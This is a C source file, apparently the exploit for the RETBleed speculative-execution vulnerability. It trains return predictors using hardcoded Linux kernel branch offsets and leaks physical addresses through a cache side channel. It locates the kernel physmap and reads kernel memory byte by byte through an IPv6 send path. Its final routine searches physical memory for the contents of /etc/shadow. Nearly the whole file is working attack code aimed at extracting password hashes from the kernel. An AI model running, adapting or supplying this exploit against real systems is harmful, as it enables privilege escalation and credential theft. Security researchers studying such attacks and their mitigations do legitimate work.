#define _GNU_SOURCE
#include "retbleed.h"
#include <sys/prctl.h>
#include <sched.h>

#include <ctype.h>
#include <err.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/time.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/ioctl.h>
#include <dirent.h>
#include <getopt.h>

static int cpu1 = -1;
static int cpu2 = -1;

#define ROUNDS 64
//#define ROUNDS 256
#define LEAK_OFFSET 0x3dc121UL // disclosure gadget
#define LEAK_START 0x13a7269
#define ARR_SZ(a) (sizeof(a)/sizeof(a[0]))

// check a few pages around because the massage is not accurate
#define CHECK_PAGES 160

struct bhb_el {
  unsigned long src;
  unsigned long dst;
};

static struct {
    int nblocks;
    // if block size is 128M, we fits 128 GiB of ram..
    int blocks[1024];
} phys_blocks;

// we get the available phys addresses of memory here
static void phys_blocks_init () {
#define MEM_BLOCK_SZ (128ul<<20)
#define PATH_MEM "/sys/devices/system/memory"
    int fd_mem = open(PATH_MEM, O_RDONLY|O_DIRECTORY);
    DIR *memdir = opendir(PATH_MEM);
    struct dirent *dent;
    int nblocks = 0;
    while ((dent = readdir(memdir)) != NULL) {
        int index;
        if (sscanf(dent->d_name, "memory%d", &index) == 0) continue;
        phys_blocks.blocks[nblocks++] = index;
    }
    phys_blocks.nblocks = nblocks;
    close(fd_mem);
}

static u64 kernel_text;

static struct bhb_el bhb_ip6_send_skb_fast[] = {
    { .src=0x0e0606, .dst=0x0e0731 }, // 0xffffffff810e0601 jne    0xffffffff810e0731 */
    { .src=0x0e06d7, .dst=0x0e0731 }, // 0xffffffff810e06d6 jb     0xffffffff810e0731 */
    { .src=0x0e073f, .dst=0x0d3fba }, // 0xffffffff810e073f retq
    { .src=0x0d3fc2, .dst=0x0d3f95 }, // 0xffffffff810d3fc1 jmp    0xffffffff810d3f95
    { .src=0x0d3f9a, .dst=0x0d3f9e }, // 0xffffffff810d3f99 je     0xffffffff810d3f9e
    { .src=0x0d3fad, .dst=0x0d3f9b }, // 0xffffffff810d3fac jmp    0xffffffff810d3f9b
    { .src=0x0d3f9d, .dst=0x0d3fee }, // 0xffffffff810d3f9d retq
    { .src=0x0d4009, .dst=0x0d4028 }, // 0xffffffff810d4008 je     0xffffffff810d4028
    { .src=0x0d4033, .dst=0x0d4089 }, // 0xffffffff810d4032 je     0xffffffff810d4089
    { .src=0x0d4091, .dst=0x0d41e2 }, // 0xffffffff810d4091 retq
    { .src=0x0d41ec, .dst=0x0d61b5 }, // 0xffffffff810d41ec retq
    { .src=0x0d61db, .dst=0xb84eb0 }, // 0xffffffff810d61d7 callq  0xffffffff81b84eb0
    { .src=0xb84ecb, .dst=0x0d61dc }, // 0xffffffff81b84ecb retq
    { .src=0x0d61dd, .dst=0x0d61ff }, // 0xffffffff810d61dc jmp    0xffffffff810d61ff
    { .src=0x0d6210, .dst=0x0d6068 }, // 0xffffffff810d620c jmpq   0xffffffff810d6068
    { .src=0x0d6089, .dst=0x0d6555 }, // 0xffffffff810d6089 retq
    { .src=0x0d6556, .dst=0xe00287 }, // 0xffffffff810d6556 retq
    { .src=0xe0028b, .dst=0xe00188 }, // 0xffffffff81e00287 jmpq   0xffffffff81e00188
    { .src=0xe001cf, .dst=0xc010e2 }, // 0xffffffff81e001cf retq
    { .src=0xc010e3, .dst=0x03551d }, // 0xffffffff81c010e3 retq
    { .src=0x035525, .dst=0x0a1026 }, // 0xffffffff81035525 retq
    { .src=0x0a1027, .dst=0x0a1008 }, // 0xffffffff810a1026 jmp    0xffffffff810a1008
    { .src=0x0a1014, .dst=0x0a1080 }, // 0xffffffff810a1014 retq
    { .src=0x0a1081, .dst=0x0a1061 }, // 0xffffffff810a1080 jmp    0xffffffff810a1061
    { .src=0x0a1069, .dst=0xa8b1d7 }, // 0xffffffff810a1069 retq
    { .src=0xa8b1fc, .dst=0xa8e99b }, // 0xffffffff81a8b1fc retq
    { .src=0xa8e9a2, .dst=0xa8e8e0 }, // 0xffffffff81a8e99e jmpq   0xffffffff81a8e8e0
    { .src=0xa8e8ef, .dst=0xa8eacd }, // 0xffffffff81a8e8ef retq
    { .src=0xa8eadc, .dst=0xa8ebc7 }, // 0xffffffff81a8eadc retq
    { .src=0xa8ebe5, .dst=0xadf44d }, // 0xffffffff81a8ebe5 retq
    { .src=0xadf454, .dst=0xa8f253 }, // 0xffffffff81adf454 retq
    { .src=0xa8f256, .dst=0xa8f28c }, // 0xffffffff81a8f255 je     0xffffffff81a8f28c
    { .src=0xa8f290, .dst=0xab4ed2 }, // 0xffffffff81a8f290 retq
};

static struct bhb_el bhb_ip6_send_skb_slow[] = {
  { .src=0x100167, .dst=0x10016b }, // 0x100166 jne    0xffffffffaf90016b
  { .src=0x100173, .dst=0x100130 }, // 0x10016f callq  0xffffffffaf900130
  { .src=0x100144, .dst=0x1006b0 }, // 0x100140 callq  0xffffffffaf9006b0
  { .src=0x10071c, .dst=0x100733 }, // 0x10071b jmp    0xffffffffaf900733
  { .src=0x100751, .dst=0x074fb0 }, // 0x10074d callq  0xffffffffaf874fb0
  { .src=0x074fdc, .dst=0x100752 }, // 0x074fdc retq
  { .src=0x100755, .dst=0x100145 }, // 0x100755 retq
  { .src=0x100152, .dst=0x100174 }, // 0x100152 retq
  { .src=0x100177, .dst=0x0d61cf }, // 0x100177 retq
  { .src=0x0d61db, .dst=0xb84eb0 }, // 0x0d61d7 callq  0xffffffffb0384eb0
  { .src=0xb84ebd, .dst=0x100154 }, // 0xb84eb9 callq  0xffffffffaf900154
  { .src=0x10016a, .dst=0xb84ebe }, // 0x10016a retq
  { .src=0xb84ecb, .dst=0x0d61dc }, // 0xb84ecb retq
  { .src=0x0d61dd, .dst=0x0d61ff }, // 0x0d61dc jmp    0xffffffffaf8d61ff
  { .src=0x0d6210, .dst=0x0d6068 }, // 0x0d620c jmpq   0xffffffffaf8d6068
  { .src=0x0d6089, .dst=0x0d6555 }, // 0x0d6089 retq
  { .src=0x0d6556, .dst=0xe00287 }, // 0x0d6556 retq
  { .src=0xe0028b, .dst=0xe00188 }, // 0xe00287 jmpq   0xffffffffb0600188
  { .src=0xe001cf, .dst=0xc010e2 }, // 0xe001cf retq
  { .src=0xc010e3, .dst=0x03551d }, // 0xc010e3 retq
  { .src=0x035525, .dst=0x0a1026 }, // 0x035525 retq
  { .src=0x0a1027, .dst=0x0a1008 }, // 0x0a1026 jmp    0xffffffffaf8a1008
  { .src=0x0a1014, .dst=0x0a1080 }, // 0x0a1014 retq
  { .src=0x0a1081, .dst=0x0a1061 }, // 0x0a1080 jmp    0xffffffffaf8a1061
  { .src=0x0a1069, .dst=0xa8b1d7 }, // 0x0a1069 retq
  { .src=0xa8b1fc, .dst=0xa8e99b }, // 0xa8b1fc retq
  { .src=0xa8e9a2, .dst=0xa8e8e0 }, // 0xa8e99e jmpq   0xffffffffb028e8e0
  { .src=0xa8e8ef, .dst=0xa8eacd }, // 0xa8e8ef retq
  { .src=0xa8eadc, .dst=0xa8ebc7 }, // 0xa8eadc retq
  { .src=0xa8ebe5, .dst=0xadf44d }, // 0xa8ebe5 retq
  { .src=0xadf454, .dst=0xa8f253 }, // 0xadf454 retq
  { .src=0xa8f256, .dst=0xa8f28c }, // 0xa8f255 je     0xffffffffb028f28c
  { .src=0xa8f290, .dst=0xab4ed2 }, // 0xa8f290 retq
};

static struct bhb_el *bhb_ip6_send_skb;

//#define bhb_ip6_send_skb bhb_ip6_send_skb_slow
#define bhb_ip6_send_skb_a bhb_ip6_send_skb
#define bhb_ip6_send_skb_b bhb_ip6_send_skb

//#define bhb_ip6_send_skb bhb_ip6_send_skb_slow

/* #define VERIFY */
#define NBUFS 58
#define BUF_STRIDE_BITS 35

void tlb_flush(u8 **tlbs) {
    // flush someway, i don't care exactly how.
    for (size_t k = 0; k < NBUFS; ++k) {
        unsigned char *t = tlbs[k];
        for (int i = 0 ; i < 40;  ++i ) {
            t[i*0x1000]  = i;
        }
    }
}

// creates a reloadbuffer, which we have leaked the physical address of.
int mem_info_init (struct mem_info *rb) {
    __attribute__((aligned(4096))) size_t results[256] = {0};

    // local reloadbuffer just for finding rb->pa
    u8 *reloadbuffer = mmap_huge((u8 *)(0x132UL<<21), 1<<21);

    u8* leak = map_or_die((u8*)0x210eeff01000UL, 0x2000);
    leak[0] = 1;
    leak[0x1000] = 1;

    // you could all be part of the big an happy buffer.
    void *victim;
    /* mmap_huge(victim, 1UL<<21); */

    u8 *bufs[NBUFS];
    for (long i = 0 ; i < NBUFS; ++i ) {
        bufs[i] = (u8 *)((i+1)<<BUF_STRIDE_BITS);
        mmap_huge(bufs[i], 1UL<<21);
    }

    u64 t0 = get_ms();
    for (;;) {
        /* int r = rand()%NBUFS; // randomly select a pa */
        /* void *tmp = bufs[r]; */
        /* bufs[r] = victim; */
        /* victim = tmp; */
        // sorry no more switcihng if rb is hard to reverse.
        victim = rb->buf;

        INFO("Leak PA of %p (LP-MDS)...\n", victim);
        long mask     = 0xfffffff800000fffL;
        long prefix   = 0x80000000000008e7L;
        long gotsofar = 0;
        for (char rotate = 28; rotate >= 20; rotate -= 8) {
            memset(results, 0, sizeof(results));
            INFO("0x%09lx", gotsofar);
            fflush(stdout);
            mask |= 0xffL<<rotate;
#define MAX_ITS 10000
            int i;
            for(i = 0; i < MAX_ITS; ++i) {
#define PAGEFAULT
#ifdef PAGEFAULT
                madvise(leak, 2*4096, MADV_DONTNEED);
#endif
                flush_range(reloadbuffer, 1<<10, 0x100);
                tlb_flush(bufs);

                reloadbuffer[0x680] = 1; // bring back rb to TLB
                __asm__ volatile(
                        "movq (%0), %%r13\n"
                        "movq (%[tgt]), %%r12\n"
                        "andq %[mask], %%r13\n"
                        "xorq %[prefix], %%r13\n"
                        "rorq %[rotate], %%r13\n"
                        "shl $0xa, %%r13\n"
                        "prefetcht0 (%%r13, %1)\n"
                        "mfence\n"
                        ::"r"(leak + 0x103f),
                        "r"(reloadbuffer),
                        [prefix]"r"(prefix),
                        [mask]"r"(mask),
                        [rotate]"c"(rotate),
                        [tgt]"r"(victim+0xc80): "r13", "r12");
                reload_range(reloadbuffer, 1<<10, 0x100, results);
                // We're zero-biased so ignore leaking pages with 0.
                results[0] = 0;
                size_t max  = max_index(results, 0xff);
                if (results[max] > 5) {
                    break;
                }
            }
            if (i >= MAX_ITS-1) {
                ERROR("Max iterations...");
                break;
            }
            size_t max  = max_index(results, 0xff);
            if (results[max] == 0) {
              goto restart; // haha
            }
            prefix     |= max<<rotate;
            gotsofar   |= max<<rotate;
        }

        if (gotsofar == 0) {
restart:;
            printf("\n");
            WARN("Bad signal, try different page\n");
            continue;
        }

        SUCCESS("0x%09lx", gotsofar);
        printf(" t=%lums\n", get_ms() - t0);
        fflush(stdout);

        rb->pa = gotsofar;
        rb->buf = victim;
        break;
    }

    for (long i = 0 ; i < NBUFS; ++i ) {
        munmap(bufs[i], 1UL<<21);
    }
    munmap(reloadbuffer, 1<<21);
    munmap(leak, 0x2000);

    return 0;
}

#define HIST_LEN 29
#define TRAINING_ASM(ret_path) __asm__(\
                            "mov %[retp], %%r10 \n\t"\
                            ".rept " xstr(HIST_LEN+1) "\n\t"\
                            "pushq (%%r10)\n\t"\
                            "add $8, %%r10\n\t"\
                            ".endr\n\t"\
                            "ret\n\t"\
                            :: [retp]"r"(ret_path) : "r10");

#include <netinet/in.h>
#include <sys/socket.h>
#include <errno.h>
int safe_socket(const char *file, const int lineno, void (cleanup_fn)(void),
        int domain, int type, int protocol)
{
    int rval, ttype;

    rval = socket(domain, type, protocol);

    if (rval == -1) {
        switch (errno) {
#define TINFO	16	/* Test information flag */
#define TCONF	32	/* Test not appropriate for configuration flag */
#define TBROK	2	/* Test broken flag */
            case EPROTONOSUPPORT:
            case ESOCKTNOSUPPORT:
            case EOPNOTSUPP:
            case EPFNOSUPPORT:
            case EAFNOSUPPORT:
                ttype = TCONF;
                break;
            default:
                ttype = TBROK;
        }
        err(rval, "socket(%d, %d, %d) failed", domain, type, protocol);
    } else if (rval < 0) {
        err(rval, "Invalid socket(%d, %d, %d) return value %d", domain, type, protocol, rval);
    }
    return rval;
}

#define SAFE_SOCKET(domain, type, protocol) \
    safe_socket(__FILE__, __LINE__, NULL, domain, type, protocol)

int safe_bind(const char *file, const int lineno, void (cleanup_fn)(void),
        int socket, const struct sockaddr *address,
        socklen_t address_len)
{
    int i, ret;
    char buf[128];

    for (i = 0; i < 120; i++) {
        ret = bind(socket, address, address_len);

        if (!ret)
            return 0;

        if (ret != -1) {
            err(ret, "Invalid bind(%d, %d) return value %d", socket, address_len, ret);
        } else if (errno != EADDRINUSE) {
            err(ret, "bind(%d, %d) failed", socket, address_len);
        }

        if ((i + 1) % 10 == 0) {
            err(1, "address is in use, waited %3i sec", i + 1);
        }

        sleep(1);
    }

    err(-1, "Failed to bind(%d, %d) after 120 retries", socket, address_len);
    return -1;
}

#define SAFE_BIND(socket, address, address_len) \
    safe_bind(__FILE__, __LINE__, NULL, socket, address, \
            address_len)

int safe_getsockname(const char *file, const int lineno,
        void (cleanup_fn)(void), int sockfd, struct sockaddr *addr,
        socklen_t *addrlen)
{
    int rval;
    char buf[128];

    rval = getsockname(sockfd, addr, addrlen);

    if (rval == -1) {
        err(rval, "getsockname(%d, %d) failed", sockfd, *addrlen);
    } else if (rval) {
        err(rval, "Invalid getsockname(%d, %d) return value %d", sockfd, *addrlen, rval);
    }

    return rval;
}

#define SAFE_GETSOCKNAME(sockfd, addr, addrlen) \
    safe_getsockname(__FILE__, __LINE__, NULL, sockfd, addr, \
            addrlen)

// va of the history setup space
#define HISTORY_SPACE 0x788800000000UL

// 1MiB is enough. We bgb uses only the lower 19 bits, and since there's a
// risk of overflowing (dst0=..7f...., src1=..80....) we can keep the lower 19 for
// the src and the lower 20 for the dst.
#define HISTORY_SZ    (1UL<<20)

// fall inside the history buffer: ffffffff830000000 -> 0x30000000
#define HISTORY_MASK  (HISTORY_SZ-1)
#define BB_START_MASK HISTORY_MASK
#define BB_END_MASK  HISTORY_MASK
#define OP_RET 0xc3

/* #define DEBUG_CHAIN */

// all kinds of bogus in here needed for to exploit the ip6 spectre primitive
#define MSG_SZ 48
typedef struct {
    int sdr, sdw;
    struct sockaddr_in6 addr_r, addr_w, addr_f;
    struct iovec iov;
    struct msghdr msghdr;
    socklen_t addrlen_r;
    struct sockaddr_in6 addr_init;
    char msg[MSG_SZ+1];  // null terminated
    // one extra entry to put the training branch
    u8* ret_path[HIST_LEN+1];
    u8* bb_spaces[HIST_LEN];

} spec_prim_t;


// number of bhb entries, history_spaces and ret_paths entries is defined by
// len, please remember that each history_space contains a single basic block.
// note: dst makes a bb start and src makes a bb end (because it's a branch
// source).
void setup_bhb(spec_prim_t *ctx, struct bhb_el* bhb) {
    int len = ARR_SZ(ctx->bb_spaces);
    u8 **ret_path = &ctx->ret_path[1];
    u8* bb_space = ctx->bb_spaces[0];

    u8* bb_end = &bb_space[bhb[0].src & BB_END_MASK];
    // let's start one byte before end so we can debug there.
    // we dont have the 'dst' that leads to this bb so we just make it anything (like bb_start-1)
    u8* bb_start = bb_end - 1;
    *bb_start = 0x90;
#ifdef DEBUG_CHAIN
    printf("[00] %lx ... %lx\n", (u64)bb_start, (u64)bb_end);
    *bb_start= 0xcc;
#endif
    *bb_end = OP_RET;
    ret_path[len-1] = bb_start;
    for (int i = 1; i < len; ++i) {
        bb_space = ctx->bb_spaces[i];
        // the previous branch dst marks the beginning of this bb
        bb_start = &bb_space[bhb[i-1].dst & BB_START_MASK];
        // the current branch source marks the end of this bb
        bb_end   = &bb_space[bhb[i].src & BB_END_MASK];
        if (bb_end < bb_start) {
            // that should do it ;)
            bb_end += (1UL<<19);
            printf("[%d] need to insert %ld nops (%p -> %p) %lx\n",i, bb_end -
                    bb_start,bb_start,bb_end, bhb[i-1].dst);
        }
        /* printf("[%d] need to insert %ld nops (%p -> %p)\n",i, bb_end - bb_start,bb_start,bb_end); */
        u8* b;
        for (b = bb_start; b < bb_end - 14; b+=15) {
            /* #define NOP15 ".byte \
             * 0x66,0x66,0x66,0x66,0x66,0x66,0x66,0x0F,0x1F,0x84,0x00,0x00,0x00,0x00,0x00\n\t"
             * */
            b[0]=0x66;  b[1]=0x66;  b[2]=0x66;  b[3]=0x66;  b[4]=0x66;
            b[5]=0x66;  b[6]=0x66;  b[7]=0x0F;  b[8]=0x1F;  b[9]=0x84;
            b[10]=0x00; b[11]=0x00; b[12]=0x00; b[13]=0x00; b[14]=0x00;
        }
        memset(b, 0x90, bb_end-b);
#ifdef DEBUG_CHAIN
        printf("[%02d] %lx ... %lx\n", i, (u64)bb_start, (u64)bb_end);
        bb_end[-1]	= 0xcc;
#endif
        *bb_end = OP_RET;
        ret_path[len-i-1] = bb_start;
    }
}

struct in6_addr sin6_addr = IN6ADDR_LOOPBACK_INIT;	/* IPv6 address */
void spectre_primitive_init(spec_prim_t *ctx) {
    ctx->addr_init.sin6_family = AF_INET6;
    ctx->addr_init.sin6_port   = htons(0);
    ctx->addr_init.sin6_addr   = sin6_addr;

    ctx->sdr = SAFE_SOCKET(PF_INET6, SOCK_DGRAM | SOCK_CLOEXEC, IPPROTO_IP);
    SAFE_BIND(ctx->sdr, (struct sockaddr*)&ctx->addr_init, sizeof(ctx->addr_init));
    ctx->addrlen_r = sizeof(ctx->addr_r);
    SAFE_GETSOCKNAME(ctx->sdr, (struct sockaddr*)&ctx->addr_r, &ctx->addrlen_r);
    ctx->sdw = SAFE_SOCKET(PF_INET6, SOCK_DGRAM|SOCK_CLOEXEC, IPPROTO_IP);
    memset(ctx->msg, 'A', MSG_SZ);
    ctx->msg[MSG_SZ] = '\0';
    ctx->iov.iov_base = ctx->msg;
    ctx->iov.iov_len = MSG_SZ;
    ctx->msghdr.msg_name	= &ctx->addr_f;
    ctx->msghdr.msg_namelen	= sizeof(ctx->addr_f);
    ctx->msghdr.msg_iov	= &ctx->iov;
    ctx->msghdr.msg_iovlen	= 1;
    ctx->msghdr.msg_control	= NULL;
    ctx->msghdr.msg_controllen	= 0;
    ctx->msghdr.msg_flags	= 0;
}

void spectre_primitive_trigger(spec_prim_t *ctx, u64 rb_kva, u64 target) {
    /*
     * MOV    RAX,qword ptr [R14 + 0x28] // loads &secret
     * MOV    RDX,qword ptr [R14 + 0x20] // loads rb
     * MOV    dword ptr [RDX + 0x1c],0xffffffff // loads rb[0x1c]
     * MOVZX  EAX,byte ptr [RAX + 0x14]  // loads *(secret+0x14)
     * ADD    RAX,0x1 // secret + 1 (so might flow over)
     * MOV    ECX,dword ptr [RDX + RAX*0x4 + 0x58] // + 0x58
     */
    *(u64 *)(ctx->msg+0x18) = rb_kva - 0x5c;
    *(u64 *)(ctx->msg+0x20) = (u64)(target - 0x14);
    sendto(ctx->sdw, ctx->msg, MSG_SZ, 0, (struct sockaddr*)&ctx->addr_r, ctx->addrlen_r);
}


void spectre_primitive_trigger_phy(spec_prim_t *ctx, u64 rb_kva) {
/**
 * fff81b4e02d 49 8b 46 30     MOV        RAX,qword ptr [R14 + 0x30]
 * fff81b4e031 49 8b 4e 20     MOV        RCX,qword ptr [R14 + 0x20]
 * fff81b4e035 48 8b 50 50     MOV        RDX,qword ptr [RAX + 0x50]
 **/
    *(u64 *)(ctx->msg+0x28) = rb_kva - 0x50;
    sendto(ctx->sdw, ctx->msg, MSG_SZ, 0, (struct sockaddr*)&ctx->addr_r, ctx->addrlen_r);
}


void do_train(void *ret_path) {
    int a;
    // how does this even work??
    for (int k = 0 ; k < 1; ++k ) {
    should_segfault=1;
    a = sigsetjmp(env, 1);
        if (a == 0) {
            TRAINING_ASM(ret_path);
        }
    should_segfault=0;
    }
}

static inline __attribute__((always_inline)) void reload_one(long addr, u64 *results) {
    unsigned volatile char *p = (u8 *)addr;
    u64 t0 = rdtsc();
    *(volatile unsigned char *)p;
    u64 dt = rdtscp() - t0;
    if (dt < 40) results[0]++;
}

#define PHYSMAP_MIN 0xffff880000000000UL
#define PHYSMAP_MAX (PHYSMAP_MIN+(25088UL<<30))

void do_find_physmap(struct mem_info *rb, spec_prim_t *spec_prim_a, spec_prim_t *spec_prim_b) {
  int rounds = 0 ;
  long guess = 0;
  long rof = 33<<6; // use some CL for reloading. probably does not matter
  int x = 0;
  for (u64 guess_physmap = PHYSMAP_MIN ; guess_physmap < PHYSMAP_MAX; guess_physmap += 1UL<<30) {
    rounds++;
    u64 r =0;
    for (int i = 0 ; i < 6; ++i) {
        do_train(spec_prim_a->ret_path);
        do_train(spec_prim_b->ret_path);
        asm volatile(
                "clflushopt (%0)\n\t"
                "clflushopt (%0)\n\t"::"r"(rb->va+rof));
        asm("lfence");
        spectre_primitive_trigger_phy(spec_prim_a, guess_physmap+rb->pa+rof);
        asm("mfence");
        int ro = r;
        reload_one(rb->va+rof, &r);
        if (ro != r) {
            /* WARN("i=%d\n", i); */
        }
    }
    if (r > 0) {
      /* WARN("r=%ld ; round=%d\n", r, rounds); */
      guess = guess_physmap;
      break;
    }
  }
  rb->kva = guess+rb->pa;
}

struct pthread_args {
    struct mem_info *rb;
    spec_prim_t *spec_prim_a;
    spec_prim_t *spec_prim_b;
};

void *_do_find_physmap(void *arg) {
    struct pthread_args *a = arg;
    do_find_physmap(a->rb, a->spec_prim_a, a->spec_prim_b);
    if (a->rb->pa == a->rb->kva) {
      pthread_t t;
      // didnt work. try a different kernel. Actually.. if we hit the sweet spot
      // we can clean up all the other threads.. so we may wana store them
      // globally to kill em all later.
      pthread_create(&t, NULL, _do_find_physmap, arg);
      pthread_join(t, NULL);
    }
    return a->rb;
}


#define SHIFT 12
#define BUF_SZ (1UL<<21UL)
void evict(unsigned char *map) {
    // L1d
    for (int i = 7 ; i >= 0; --i) {
        asm volatile ("movq %%rax, (%0)\n" : : "c" (&map[(i<<SHIFT)]) : );
    }
    for (int i = 0 ; i > 8; ++i) {
        asm volatile ("movq %%rax, (%0)\n" : : "c" (&map[(i<<SHIFT)]) : );
    }
    for (int i = 7 ; i >= 0; --i) {
        asm volatile ("movq %%rax, (%0)\n" : : "c" (&map[(i<<SHIFT)]) : );
    }

#ifdef ALLOW_THP
#define M 4
#else
#define M 8
#endif
    // L2
    for (int i = M-1 ; i >=0; --i) {
        asm volatile ("movq %%rax, (%0)\n" : : "c" (&map[(i<<16)]) : );
    }
    for (int i = 1 ; i < M; ++i) {
        asm volatile ("movq %%rax, (%0)\n" : : "c" (&map[(i<<16)]) : );
    }
    for (int i = M-1 ; i >=0; --i) {
        asm volatile ("movq %%rax, (%0)\n" : : "c" (&map[(i<<16)]) : );
    }
}

inline
void
__attribute__((always_inline))
maccess(void* p)
{
        __asm__ volatile ("movq %%rax, (%0)\n" : : "c" (p) : "rax");
}

void *_do_evict(void *arg) {
#define MY_PTR 0x13350f000000UL
    int cpu = cpu2;
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(gettid(), sizeof(set), &set);

    unsigned char *map = (unsigned char *) MY_PTR;
    /* unsigned char *map2 = (unsigned char *) MY_PTR+BUF_SZ; */
#ifdef ALLOW_THP
    mmap_huge(map, BUF_SZ);
#else
    map_or_die(map, BUF_SZ);
    //mmap_huge(map, BUF_SZ);
#endif

    unsigned long addr = 0xb40;

    for (;;) {
        /* evict(map+addr); */
        /* evict(map2+addr); */
            for (long x = 0; x < (BUF_SZ>>(SHIFT+2)); x++) {
                maccess(&map[addr + (x<<SHIFT)]);
                map[addr + (x<<SHIFT)]+=122;
            }
			evict(map + addr);
            for (long x = (BUF_SZ>>(SHIFT+2))-2; x >= 0 ; x--) {
                maccess(&map[addr + (x<<SHIFT)]);
                map[addr + (x<<SHIFT)]+=12;
            }
            evict(map+addr+0x40000);
			evict(map+addr+0x80000);
			evict(map+addr+0x100000);
    }
    return NULL;
}


#define RB_SLOTS 16
#define RB_STRIDE_BITS 6

int cmp_dsc (const void *a, const void *b) {
    return *(u64 *)b - *(u64 *)a;
}

static char* strengths[] = {
    COLOR_BG_WHT,
    COLOR_BG_PWHT,
    COLOR_BG_PMAG,
    COLOR_BG_MAG,
    COLOR_BG_PYEL,
    COLOR_BG_YEL,
    COLOR_BG_PGRN,
    COLOR_BG_GRN,
};

static void print_results_color(u64 *results, int n, u64 rounds) {
    int maxi = max_index(results, n-1);
    if (results[maxi] <= ROUNDS/100) {
        return;
    }
    INFO("RB heat: ");
    for (int i = 0; i < n; ++i) {
        int x = (results[i] * ARR_SZ(strengths) / results[maxi]) - 1;
        char *color = strengths[x == -1 ? 0 : x];
        printf("%s  " COLOR_NC, color);
        fflush(stdout);
    }
    printf(" guess=0x%x; n=%02ld; %02.3f",maxi, results[maxi], results[maxi]/(.0+rounds));

    if (results[maxi] >= rounds*0.95) {
        printf(" " COLOR_BG_GRN "Perfect!" COLOR_NC "\n");
    } else {
        printf("\n");
    }
}

// we expect `hot` to be hot here. so we shift it outside and see how much we
// need to add to the rb for the 0th entry to turn hot.
int do_retbleed_slide(struct mem_info *rb, spec_prim_t *a, spec_prim_t *b, u64 secret_ptr, int hot) {
    u64 results = 0;
    int add = 0x40;
    int rb_off = 0x0;
#define HOT_THRES 0.7

    for (int k = 0; k < 4; ++ k) {
        add >>= 1;
        if (results > ROUNDS*HOT_THRES) {
            rb_off -= add;
        } else {
            rb_off += add;
        }
        results = 0;
        for (int i = 0; i < ROUNDS; ++i) {
            do_train(a->ret_path);
            do_train(b->ret_path);
            flush_range(rb->buf, 1<<RB_STRIDE_BITS, RB_SLOTS);
            asm("lfence");
            spectre_primitive_trigger(a, rb->kva - (hot+1)*64 + rb_off, secret_ptr);
            // correctly just reload the first entry.
            reload_one(rb->va, &results);
        }
        /* print_results_color(results, RB_SLOTS, R2); */
    }
    if (rb_off < 0) {
        return -1;
    }
    if (results < ROUNDS*HOT_THRES) {
        rb_off += 4;
    }

    int guess = (hot<<4) | ((0x40-rb_off)>>2);
    /* SUCCESS("Byte=%x (%ld)\n", guess, results); */

    return guess;
}

int do_retbleed(struct mem_info *rb, spec_prim_t *a, spec_prim_t *b, u64 secret_ptr) {
    u64 results[RB_SLOTS] = {0};
    memset(results, 0, sizeof(results[0])*RB_SLOTS);
    int guess = 0xff;
    int guess2 = 0xff;
    static int numbers[] = { 1, 11, 13, 3, 9, 5, 7, 15 };
#define RELOAD_PER_ROUND ARR_SZ(numbers)
    for (int i = 0; i < ROUNDS ; ++i) {
        do_train(a->ret_path);
        do_train(b->ret_path);
        flush_range(rb->buf, 1<<RB_STRIDE_BITS, RB_SLOTS);
        asm("lfence");
        spectre_primitive_trigger(a, rb->kva, secret_ptr);
        for (int ii = 0; ii < ARR_SZ(numbers); ++ii) {
            int cur = ((i+numbers[ii]) & 0xf);
            reload_one(rb->va + (cur<<RB_STRIDE_BITS), &results[cur]);
        }
    }

    int maxi = max_index(results, RB_SLOTS-1);
    int tmp = results[maxi];
    results[maxi] = 0;
    int maxi_2nd = max_index(results, RB_SLOTS-1);
    results[maxi] = tmp;
    guess = maxi;
    guess2 = maxi_2nd;

    u64 reloads_per_slot = ROUNDS/(RB_SLOTS/RELOAD_PER_ROUND);

    /* print_results_color(results, RB_SLOTS, reloads_per_slot); */
    int hotslot = -1;
    // Good. We know where we should look. Now slide hot slots over the page
    // boundary to see if it kills the signal.
    for (int i = 0; i < RB_SLOTS; ++i) {
        if (results[i] < reloads_per_slot*0.90) continue;
        u64 results2[RB_SLOTS] = {0};
        memset(results2, 0, RB_SLOTS*8);
        for (int c = 0 ; c < ROUNDS; ++c ) {
            do_train(a->ret_path);
            do_train(b->ret_path);
            flush_range(rb->buf, 1<<RB_STRIDE_BITS, RB_SLOTS);
            asm("lfence");
            // slide the hot entry over the page boundary edge. If it's the
            // right one, we will have no signal anyway.
            spectre_primitive_trigger(a, rb->kva - (i+1)*64, secret_ptr);
            // this seems unnecessary: we only need to check index 0.
            for (int ii = 0; ii < ARR_SZ(numbers); ++ii) {
                int cur = ((i+numbers[ii]) & 0xf);
                reload_one(rb->va + (cur<<RB_STRIDE_BITS), &results2[cur]);
            }
        }
        if (results2[max_index(results2, RB_SLOTS-1)] < reloads_per_slot*0.5) {
            // signal is gone!
            hotslot = i;
            break;
        }
    }
    if(hotslot == -1) {
        /* printf("X"); */
        return -1;
    }

    // we know which cacheline, now we just need to find where inside that cache
    // line the access was.
    int byte = do_retbleed_slide(rb, a, b, secret_ptr, hotslot);

    if (byte < 0) return -1;

    return byte;
}

int do_retbleed_retry(struct mem_info *rb, spec_prim_t *a, spec_prim_t *b, u64 secret_ptr, int retries) {
    int res;
    do {
        res = do_retbleed(rb,a,b,secret_ptr);
        if (res != -1) break;
    } while (retries--);
    return res;
}

// check that we still have actually have signal
int has_signal(struct mem_info *rb, spec_prim_t *a, spec_prim_t *b) {
    if (do_retbleed(rb, a, b, kernel_text+LEAK_START) != '3') {
        if (do_retbleed(rb, a, b, kernel_text+LEAK_START) != '3') {
            if (do_retbleed(rb, a, b, kernel_text+LEAK_START) != '3') {
                return 0;
            }
        }
    }
    return 1;
}


unsigned long find_shadow_range(struct mem_info *rb, spec_prim_t *a, spec_prim_t *b, long start_pa, int npages) {
    u64 physmap_base = rb->kva - rb->pa;
    while (1) {
        u64 try_shadow = physmap_base + start_pa;
        for (long i = 0, dir = 1; i < npages; i += 1, dir *= -1) {
            try_shadow += dir*i*0x1000;
            if (do_retbleed(rb, b, a, try_shadow) == 'r') {
                if (do_retbleed(rb, b, a, try_shadow+1) == 'o') {
                    if (do_retbleed(rb, b, a, try_shadow+5) == '$') {
                        SUCCESS("/etc/shadow @ %lx\n", try_shadow);
                        return try_shadow;
                    }
                }
            }
        }

        if (!has_signal(rb, a, b)) {
            printf("\n");
            ERROR("No signal ...\n");
            exit(1);
        }
    }
    return -1;
}
